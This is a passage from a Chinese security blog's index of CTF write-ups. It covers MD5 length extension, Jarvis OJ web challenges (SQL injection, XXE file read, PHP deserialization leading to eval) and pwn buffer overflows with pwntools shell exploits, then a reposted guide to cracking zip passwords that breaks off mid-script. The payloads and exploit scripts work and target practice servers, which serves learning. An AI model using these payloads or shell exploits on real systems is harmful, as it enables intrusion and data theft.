初始化MD缓冲区在计算md5的时候会先初始化四个寄存器（A，B，C，D）且有各自的初始值： word A: 01 23 45 67 word B: 89 ab cd ef word C: fe dc ba 98 word D: 76 54 32 10 4 - 处理字块消息必须用已经完成补位 &amp; 补长度操作的字块来进行运算，具体细节不展开了，我们只需要知道经过一次消息摘要后，上面的寄存器值将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 举个栗子🌰 假设待加密的字符串为 abc 把字符串转化为16进制形式 - 616263 补位。即在二进制形式的信息后面先添一个 1 ，然后接若干个 0 直到满足 len(message) % 512 == 448 这一条件。16进制下我们在 616263 后加一个 80 （即二进制的 10000000 ），把它按照规则补位到 448 bit ，也就是56字节。 补长度。完成补位后，第 57 个字节存储的是补位之前信息的长度。原来的信息为 abc ，3个字符，3个字节，24 bit，换成16进制后为 0x18 ，其后补充7个 0x00 以补满 64 字节。 利用完成前几步补足操作的数据进行复杂运算。取出 64 字节信息，第一轮运算中使用的链变量为初始链变量，之后每一次运算链变量都会被覆盖更新，最后一轮运算产生的链变量经过高低位互换后就是我们得到的 MD5 值。 0x02 哈希长度扩展攻击MD5的补位操作正是实现长度扩展攻击的关键。 我们虽然不知道具体的 salt 值，但如果我们得到了其 hash 值以及一个可控的信息，我们就可以利用这些点进行哈希长度扩展攻击。我们得到的 hash 值正是最后一轮运算产生的链变量经过高低位互换后得到的结果，如果我们要把可控的信息进行下一轮运算，只需要知道上一轮信息产生的链变量。 回到开头贴的那份代码，关键语句为 if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } 简单说一下思路：我们可以从 cookie 里拿到一段已知的 hash ，我们也知道需要校验的内容（ admin ），salt 与其长度是未知的，但我们可以通过哈希长度扩展攻击来构造一段想利用的校验内容，即使不知道 salt 也可以得出它的 hash 值。 先将明文进行分组与填充，在其后添加我们想要增加的新内容，即新的校验内容，然后我们把原来得到的 hash 值逆为 key 值（注意 md5 中的值都是小端的），根据 MD5 加密原理，我们已经得到了 key ，就可以得出下一轮的 hash 值了（例如此处的 admin 的 hash 值。） 因为这个题里还有一个 strrev 函数（字符串反转），构造如下 payload： 原校验的内容：;&quot;tseug&quot;:5:s 新添加的内容：;&quot;nimda&quot;:5:s 原hash值：3a4727d57463f122833d9e732f94e4e0 salt 长度未知，需要进行爆破 之前的 wp 里用的是 hash_extender 这个工具，这里使用的是 hashpump 。 把 \\x 都换成 % ，可以得到 role = s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b hsh = fcdc3840332555511c4e4323f6decb07 最后修改一下Cookie得到flag。 修复方法：用 hash($SECRET, hash($message)) 的方式，这样用户就不可控 message 了，另外使用 HMAC 也是可以的。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.cyris.cn/tags/CTF/"},{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://blog.cyris.cn/tags/CRYPTO/"}]},{"title":"Jarvis OJ Writeup","date":"2017-11-04T03:23:21.000Z","path":"posts/jarvisoj-wp/","text":"记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/ WebLogin需要密码才能获得flag哦。 题目入口：http://web.jarvisoj.com:32772/ 在 Headers 里找到一条hint： Hint:&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot; 涉及到一个MD5加密后的注入问题。 关于这条md5语句我们先来看下php手册中的描述： Description string md5 ( string str [, bool raw_output] ) Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16. 注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE 也就是说，如果md5后的hex转换成字符串后，若包含 &#39;or&#39;&lt;trash&gt; 这样的字符串，那整个sql语句就会变成： SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;&lt;trash&gt;&#39; 就可以进行注入了。 网上找到一个字符串：ffifdyop md5以后：276f722736c95d99e921722cf9ed621c 再转换成字符串即为&#39;or&#39;&lt;trash&gt; 把上面这个字符串作为 password 传入即可。 api调用请设法获得目标机器/home/ctf/flag.txt中的flag值。 题目入口：http://web.jarvisoj.com:9882/ 直接能看到源码： &lt;script&gt; function XHR() { var xhr; try {xhr = new XMLHttpRequest();} catch(e) { var IEXHRVers =[&quot;Msxml3.XMLHTTP&quot;,&quot;Msxml2.XMLHTTP&quot;,&quot;Microsoft.XMLHTTP&quot;]; for (var i=0,len=IEXHRVers.length;i&lt; len;i++) { try {xhr = new ActiveXObject(IEXHRVers[i]);} catch(e) {continue;} } } return xhr; } function send(){ evil_input = document.getElementById(&quot;evil-input&quot;).value; var xhr = XHR(); xhr.open(&quot;post&quot;,&quot;/api/v1.0/try&quot;,true); xhr.onreadystatechange = function () { if (xhr.readyState==4 &amp;&amp; xhr.status==201) { data = JSON.parse(xhr.responseText); tip_area = document.getElementById(&quot;tip-area&quot;); tip_area.value = data.task.search+data.task.value; } }; xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;); xhr.send(&#39;{&quot;search&quot;:&quot;&#39;+evil_input+&#39;&quot;,&quot;value&quot;:&quot;own&quot;}&#39;); } &lt;/script&gt; 光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 XXE漏洞 ，简单地说就是利用 xml 中的 Entity 实体来读取文件或者执行系统命令等，以造成攻击。 这题里先把 Content-Type 改成 application/xml，然后构造： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xdsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;/home/ctf/flag.txt&quot; &gt;]&gt; &lt;methodcall&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; &lt;/methodcall&gt; 就可以获取flag了。 神盾局的秘密这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？ 题目入口：http://web.jarvisoj.com:32768/ 扫了一下目录，只发现了 showing.php 和 index.php。 查看源码发现 &lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt; 感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 showing.php 本身： 可以看到源码，过滤了 pctf 。但是没什么利用方式，如果直接查看 /pctf.php 拿到的是假flag。同样的方式读取 index.php： &lt;?php require_once(&#39;shield.php&#39;); $x = new Shield(); isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;]; if (!empty($g)) { $x = unserialize($g); } echo $x-&gt;readfile(); ?&gt; 然后拿到 shield.php 的源码： &lt;?php //flag is in pctf.php class Shield { public $file; function __construct($filename = &#39;&#39;) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) { return @file_get_contents($this-&gt;file); } } } ?&gt; shield.php 中说flag在 pctf.php 里，但是在 showing.php 中被过滤了，所以直接读它拿到的是假flag。留意到 index.php 里用了反序列化，可以利用这点构造payload： &lt;?php class Shield { public $file; function __construct($filename = &#39;&#39;) { $this -&gt; file = $filename; } } $a = new Shield(); $a-&gt;file = &quot;pctf.php&quot;; echo serialize($a); ?&gt; 序列化后的结果为： O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;} 利用 index.php 中的 class 参数传入payload然后再反序列化就可以拿到flag了。 http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;} &lt;!--?php //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a} //Fake flag: echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot; ?--&gt; flag在管理员手里只有管理员才能获得flag，你能想办法获得吗？ 题目链接：http://web.jarvisoj.com:32778/ vim备份文件泄露（ /index.php~ ），恢复后拿到源码（题目有点问题，vim -r 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了） &lt;html&gt; &lt;head&gt; &lt;title&gt;Web 350&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body { background:gray; text-align:center; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = ; if (isset($_COOKIE[&quot;role&quot;])) { $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } else { $auth = false; } else {} $s = serialize($role); setcookie(&#39;role&#39;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#39;hsh&#39;,$hsh); } if ($auth) { echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot; } else { echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; } ?&gt; &lt;/body&gt; &lt;/html&gt; 核心语句为： $role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])) 查了些资料，发现可以使用 哈希长度扩展攻击 。 做题的时候整理了一下这里涉及的知识点 - 传送门 利用工具： HashPumphash_extender 已有条件： Cookie-hsh：3a4727d57463f122833d9e732f94e4e0 Cookie-role：s%3A5%3A%22guest%22%3B 需要求：md5(salt+strrev(admin)) * salt长度未知 这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本： from urlparse import urlparse from httplib import HTTPConnection from urllib import urlencode import json import time import os import urllib def gao(x, y): #print x #print y url = &quot;http://web.jarvisoj.com:32778/index.php&quot; cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y #print cookie build_header = { &#39;Cookie&#39;: cookie, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&#39;, &#39;Host&#39;: &#39;web.jarvisoj.com:32778&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, } urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request(&quot;GET&quot;, urlparts.path, &#39;&#39;, build_header) resp = conn.getresponse() body = resp.read() return body for i in xrange(1000): print i # secret len = ??? find_hash = &quot;./hash_extender -d &#39;;\\&quot;tseug\\&quot;:5:s&#39; -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a &#39;;\\&quot;nimda\\&quot;:5:s&#39; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot; #print find_hash calc_res = os.popen(find_hash).readlines() hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if &quot;Welcome&quot; in ret: print ret break 得到回显： ... 12 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Web 350&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body { background:gray; text-align:center; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} &lt;/h3&gt; &lt;/body&gt; &lt;/html&gt; 同时也可以知道 salt 的长度为12。 PHPINFO题目入口：http://web.jarvisoj.com:32784/ 上来就给出了源码： &lt;?php //A webshell is wait for you ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); //设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = &#39;phpinfo();&#39;; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET[&#39;phpinfo&#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(&#39;index.php&#39;)); } ?&gt; 注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的文章。 PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化： 处理器 存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列化的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列化的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列化的数组 漏洞产生在 php_serialize 和 php 的解析方式上。如果我们用 php_serialize 的方式构造序列化语句，然后通过 php 解析语句，会出现一些问题，因为在使用 php_serialize 构造语句时我们可以使用 ‘|’ 这个符号，但是在 php 进行解析时会将 ‘|’ 符号前的数据当作数组中的键，其后的数据当作值，这个时候我们就可以构造特殊的语句来进行利用了。 通过 phpinfo 页面可以获得的信息有： php 版本为 5.6.21 。 php.ini 中默认的 session.serialize_handler 为 php_serialize ，而 index.php 中确将它设置成了 php （这就导致了 session 反序列化的问题）。 session.upload_progress.enabled 的状态为 On 。 session.upload_progress.cleanup 为关闭状态（提高了漏洞利用成功率）。 要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。 下面开始漏洞利用。 首先写一个提交表单备用： &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;gogogo&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; 因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ： &lt;?php class OowoO { public $mdzz=&#39;print_r(scandir(dirname(__FILE__)));&#39;; } $obj = new OowoO(); echo serialize($obj); ?&gt; 序列化结果为： O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;} 为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下： |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;} Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）： 接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为: print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;)); 序列化及一些小处理后得到最终 payload ： |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;} 用同样的方式 POST 一下就好了。 CTF{4d96e37f4be998c50aa586de4ada354a} Pwn[XMAN]level0题目描述： nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d ida 载入，先是 main 函数： .text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00000000004005C6 public main .text:00000000004005C6 main proc near ; DATA XREF: _start+1D↑o .text:00000000004005C6 .text:00000000004005C6 var_10 = qword ptr -10h .text:00000000004005C6 var_4 = dword ptr -4 .text:00000000004005C6 .text:00000000004005C6 ; __unwind { .text:00000000004005C6 push rbp .text:00000000004005C7 mov rbp, rsp .text:00000000004005CA sub rsp, 10h .text:00000000004005CE mov [rbp+var_4], edi .text:00000000004005D1 mov [rbp+var_10], rsi .text:00000000004005D5 mov edx, 0Dh ; n .text:00000000004005DA mov esi, offset aHelloWorld ; &quot;Hello, World\\n&quot; .text:00000000004005DF mov edi, 1 ; fd .text:00000000004005E4 call _write .text:00000000004005E9 mov eax, 0 .text:00000000004005EE call vulnerable_function .text:00000000004005F3 leave .text:00000000004005F4 retn .text:00000000004005F4 ; } // starts at 4005C6 .text:00000000004005F4 main endp vulnerable_function 函数： .text:00000000004005A6 public vulnerable_function .text:00000000004005A6 vulnerable_function proc near ; CODE XREF: main+28↓p .text:00000000004005A6 .text:00000000004005A6 buf = byte ptr -80h .text:00000000004005A6 .text:00000000004005A6 ; __unwind { .text:00000000004005A6 push rbp .text:00000000004005A7 mov rbp, rsp .text:00000000004005AA add rsp, 0FFFFFFFFFFFFFF80h .text:00000000004005AE lea rax, [rbp+buf] .text:00000000004005B2 mov edx, 200h ; nbytes .text:00000000004005B7 mov rsi, rax ; buf .text:00000000004005BA mov edi, 0 ; fd .text:00000000004005BF call _read .text:00000000004005C4 leave .text:00000000004005C5 retn .text:00000000004005C5 ; } // starts at 4005A6 .text:00000000004005C5 vulnerable_function endp 以及一个未曾被调用但是能够打开 shell 的 callsystem 函数： .text:0000000000400596 public callsystem .text:0000000000400596 callsystem proc near .text:0000000000400596 ; __unwind { .text:0000000000400596 push rbp .text:0000000000400597 mov rbp, rsp .text:000000000040059A mov edi, offset command ; &quot;/bin/sh&quot; .text:000000000040059F call _system .text:00000000004005A4 pop rbp .text:00000000004005A5 retn .text:00000000004005A5 ; } // starts at 400596 .text:00000000004005A5 callsystem endp 可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。 ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了： from pwn import * sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9881) padding = &#39;A&#39; * 0x88 add = p64(0x400596) payload = padding + add sh.send(payload) sh.interactive() cat flag： CTF{713ca3944e92180e0ef03171981dcd41} [XMAN]level1题目描述： nc pwn2.jarvisoj.com 9877 level1.80eacdcd51aca92af7749d96efad7fb5 checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之： main 函数： .text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:080484B7 public main .text:080484B7 main proc near ; DATA XREF: _start+17↑o .text:080484B7 .text:080484B7 var_4 = dword ptr -4 .text:080484B7 argc = dword ptr 8 .text:080484B7 argv = dword ptr 0Ch .text:080484B7 envp = dword ptr 10h .text:080484B7 .text:080484B7 ; __unwind { .text:080484B7 lea ecx, [esp+4] .text:080484BB and esp, 0FFFFFFF0h .text:080484BE push dword ptr [ecx-4] .text:080484C1 push ebp .text:080484C2 mov ebp, esp .text:080484C4 push ecx .text:080484C5 sub esp, 4 .text:080484C8 call vulnerable_function .text:080484CD sub esp, 4 .text:080484D0 push 0Eh ; n .text:080484D2 push offset aHelloWorld ; &quot;Hello, World!\\n&quot; .text:080484D7 push 1 ; fd .text:080484D9 call _write .text:080484DE add esp, 10h .text:080484E1 mov eax, 0 .text:080484E6 mov ecx, [ebp+var_4] .text:080484E9 leave .text:080484EA lea esp, [ecx-4] .text:080484ED retn .text:080484ED ; } // starts at 80484B7 .text:080484ED main endp 在调用 vulnerable_function 函数之后 printf “Hello, World!\\n”。 看一下 vulnerable_function 函数： .text:0804847B public vulnerable_function .text:0804847B vulnerable_function proc near ; CODE XREF: main+11↓p .text:0804847B .text:0804847B buf = byte ptr -88h .text:0804847B .text:0804847B ; __unwind { .text:0804847B push ebp .text:0804847C mov ebp, esp .text:0804847E sub esp, 88h .text:08048484 sub esp, 8 .text:08048487 lea eax, [ebp+buf] .text:0804848D push eax .text:0804848E push offset format ; &quot;What&#39;s this:%p?\\n&quot; .text:08048493 call _printf .text:08048498 add esp, 10h .text:0804849B sub esp, 4 .text:0804849E push 100h ; nbytes .text:080484A3 lea eax, [ebp+buf] .text:080484A9 push eax ; buf .text:080484AA push 0 ; fd .text:080484AC call _read .text:080484B1 add esp, 10h .text:080484B4 nop .text:080484B5 leave .text:080484B6 retn .text:080484B6 ; } // starts at 804847B .text:080484B6 vulnerable_function endp 这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。 这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。 asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。 按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。 poc: from pwn import * sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9877) shellcode = asm(shellcraft.sh()) p_buf = int(sh.recvline()[14:-2], 16) #print (hex(p_buf)) payload = shellcode + (0x8c-len(shellcode)) * &#39;\\x90&#39; + p32(p_buf) sh.sendline(payload) sh.interactive() cat flag: CTF{82c2aa534a9dede9c3a0045d0fec8617}","tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.cyris.cn/tags/CTF/"}]},{"title":"给你压缩包却不给你密码的人到底在想什么","date":"2017-10-19T06:58:50.000Z","path":"posts/rar-attack/","text":"纯转载。原帖戳这里：veritas501 - 给你压缩包却不给你密码的人到底在想什么 0x00 开始在这里，我建议大家装两个解压软件，一个随意（我用的7z），一个是winrar。 嫌右键菜单挤你就装虚拟机里呗。 因为这两个压缩软件压缩出来的zip总是有点不同，最明显的一点，就是在已知明文攻击（后面会说）的时候，两种软件压缩出来的压缩包在构造明文压缩包的时候不能互用。 0x01 注释拿到压缩包上来一定要看有没有注释，一定要看有没有注释，一定要看有没有注释，重要的话说三遍。 有的时候他真的是想送你分，把密码或是hint写在注释里，但你就是不去看他一眼。 用hex方式打开的打一般在末尾 中文注释的话这样可能会乱码。建议压缩软件打开 0x02 弱密码这个其实真的没什么好说的，上来应该先试一试的，因为也不用动脑子，直接放后台跑就行了。 首先先跑纯数字密码，1到9位直接跑一遍，也就1分钟左右的时间吧。 不对的话可以上字典，或是短密码穷举一下，直接丢后台就行，人脑可以再做其他的方向的分析。 另外，如果跑字典都跑不到的话，可以试试此次CTF的名字，或是这个题目的名字。 软件用archpr，网上直接下就行，这里就不分享了。 0x03 压缩包伪加密一个伪加密的压缩包冒充加密压缩包，你要知道压缩软件是如何识别一个压缩包是否被加密的。 软件主要是围绕frFlags和deFlags来判断的。 我们用winrar创建一个加密的压缩包，可以看到加密的压缩包的frFlags和deFlags都为9。 其中，deFlags是针对单个文件的，压缩包中的每个文件都有。 而未加密的都为0。 用7z创建一个加密的压缩包，frFlags和deFlags都为1。这里就不多放图了。 而未加密的依然都为0。 综上，大家应该已经知道怎么改标志位来构造伪加密以及如何搞定伪加密了。（这里添一句，mac OS可以直接打开伪加密的压缩包。） 0x04 已知明文攻击一种比较巧妙的攻击方法，首先你需要一个压缩包中已知的文件(文件大小大于12bytes)，比如readme.txt ├─enc.zip │ ├─flag.txt * │ └─readme.txt * │ └─readme.txt 这样我们就可以构造明文zip ├─plaintext.zip │ └─readme.txt 原理大概是压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件反推加密密钥，利用密钥来解密其他加密文件。 划重点：构造明文压缩包时要选用与加密压缩包相同的压缩软件，如果他用winrar压的，你用7z构造出的压缩包来做明文压缩包，软件是会报错的。 这样就是还原出密钥了，点OK后软件会叫你保存解密后的压缩包。 0x05 CRC碰撞CRC32碰撞用于非常小的文件（6字节以上基本就别试了），就是通过CRC来反推文件内容。 而且CRC32是很容易碰撞的，所以就6字节而言，同一个CRC32可能对应着十几个字符串（纯可视字符）。 当文件刚好是6字节时，使用下面的crc32.py脚本 #!/usr/bin/env python # CRC32 tools by Victor #usage: python crc32.py reverse 0xffffffff（the crc） import argparse import os import sys permitted_characters = set( map(ord, &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_&#39;)) # \\w testing = False args = None def get_poly(): poly = parse_dword(args.poly) if args.msb: poly = reverseBits(poly) check32(poly) return poly def get_input(): if args.instr: return tuple(map(ord, args.instr)) with args.infile as f: # pragma: no cover return tuple(map(ord, f.read())) def out(msg): if not testing: # pragma: no cover args.outfile.write(msg) args.outfile.write(os.linesep) table = [] table_reverse = [] def init_tables(poly, reverse=True): global table, table_reverse table = [] # build CRC32 table for i in range(256): for j in range(8): if i &amp; 1: i &gt;&gt;= 1 i ^= poly else: i &gt;&gt;= 1 table.append(i) assert len(table) == 256, &quot;table is wrong size&quot; # build reverse table if reverse: table_reverse = [] found_none = set() found_multiple = set() for i in range(256): found = [] for j in range(256): if table[j] &gt;&gt; 24 == i: found.append(j) table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) &gt; 1: found_multiple.add(i) assert len(table_reverse) == 256, &quot;reverse table is wrong size&quot; if found_multiple: out(&#39;WARNING: Multiple table entries have an MSB in {0}&#39;.format( rangess(found_multiple))) if found_none: out(&#39;ERROR: no MSB in the table equals bytes in {0}&#39;.format( rangess(found_none))) def calc(data, accum=0): accum = ~accum for b in data: accum = table[(accum ^ b) &amp; 0xFF] ^ ((accum &gt;&gt; 8) &amp; 0x00FFFFFF) accum = ~accum return accum &amp; 0xFFFFFFFF def rewind(accum, data): if not data: return (accum,) stack = [(len(data), ~accum)] solutions = set() while stack: node = stack.pop() prev_offset = node[0] - 1 for i in table_reverse[(node[1] &gt;&gt; 24) &amp; 0xFF]: prevCRC = (((node[1] ^ table[i]) &lt;&lt; 8) | (i ^ data[prev_offset])) &amp; 0xFFFFFFFF if prev_offset: stack.append((prev_offset, prevCRC)) else: solutions.add((~prevCRC) &amp; 0xFFFFFFFF) return solutions def findReverse(desired, accum): solutions = set() accum = ~accum stack = [(~desired,)] while stack: node = stack.pop() for j in table_reverse[(node[0] &gt;&gt; 24) &amp; 0xFF]: if len(node) == 4: a = accum data = [] node = node[1:] + (j,) for i in range(3, -1, -1): data.append((a ^ node[i]) &amp; 0xFF) a &gt;&gt;= 8 a ^= table[node[i]] solutions.add(tuple(data)) else: stack.append(((node[0] ^ table[j]) &lt;&lt; 8,) + node[1:] + (j,)) return solutions # Tools def parse_dword(x): return int(x, 0) &amp; 0xFFFFFFFF def reverseBits(x): # http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel # http://stackoverflow.com/a/20918545 x = ((x &amp; 0x55555555) &lt;&lt; 1) | ((x &amp; 0xAAAAAAAA) &gt;&gt; 1) x = ((x &amp; 0x33333333) &lt;&lt; 2) | ((x &amp; 0xCCCCCCCC) &gt;&gt; 2) x = ((x &amp; 0x0F0F0F0F) &lt;&lt; 4) | ((x &amp; 0xF0F0F0F0) &gt;&gt; 4) x = ((x &amp; 0x00FF00FF) &lt;&lt; 8) | ((x &amp; 0xFF00FF00) &gt;&gt; 8) x = ((x &amp; 0x0000FFFF) &lt;&lt; 16) | ((x &amp; 0xFFFF0000) &gt;&gt; 16) return x &amp; 0xFFFFFFFF # Compatibility with Python 2.6 and earlier. if hasattr(int, &quot;bit_length&quot;): def bit_length(num): return num.bit_length() else: def bit_length(n): if n == 0: return 0 bits = -32 m = 0 while n: m = n n &gt;&gt;= 32 bits += 32 while m: m &gt;&gt;= 1 bits += 1 return bits def check32(poly): if poly &amp; 0x80000000 == 0: out(&#39;WARNING: polynomial degree ({0}) != 32&#39;.format(bit_length(poly))) out(&#39; instead, try&#39;) out(&#39; 0x{0:08x} (reversed/lsbit-first)&#39;.format(poly | 0x80000000)) out(&#39; 0x{0:08x} (normal/msbit-first)&#39;.format(reverseBits(poly | 0x80000000))) def reciprocal(poly): &#39;&#39;&#39; Return the reversed reciprocal (Koopman notatation) polynomial of a reversed (lsbit-first) polynomial &#39;&#39;&#39; return reverseBits((poly &lt;&lt; 1) | 1) def print_num(num): &#39;&#39;&#39; Write a numeric result in various forms &#39;&#39;&#39; out(&#39;hex: 0x{0:08x}&#39;.format(num)) out(&#39;dec: {0:d}&#39;.format(num)) out(&#39;oct: 0o{0:011o}&#39;.format(num)) out(&#39;bin: 0b{0:032b}&#39;.format(num)) import itertools def ranges(i): for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]): g = list(kg[1]) yield g[0][1], g[-1][1] def rangess(i): return &#39;, &#39;.join(map(lambda x: &#39;[{0},{1}]&#39;.format(*x), ranges(i))) # Parsers def get_parser(): &#39;&#39;&#39; Return the command-line parser &#39;&#39;&#39; parser = argparse.ArgumentParser( description=&quot;Reverse, undo, and calculate CRC32 checksums&quot;) subparsers = parser.add_subparsers(metavar=&#39;action&#39;) poly_flip_parser = argparse.ArgumentParser(add_help=False) subparser_group = poly_flip_parser.add_mutually_exclusive_group() subparser_group.add_argument( &#39;-m&#39;, &#39;--msbit&#39;, dest=&quot;msb&quot;, action=&#39;store_true&#39;, help=&#39;treat the polynomial as normal (msbit-first)&#39;) subparser_group.add_argument(&#39;-l&#39;, &#39;--lsbit&#39;, action=&#39;store_false&#39;, help=&#39;treat the 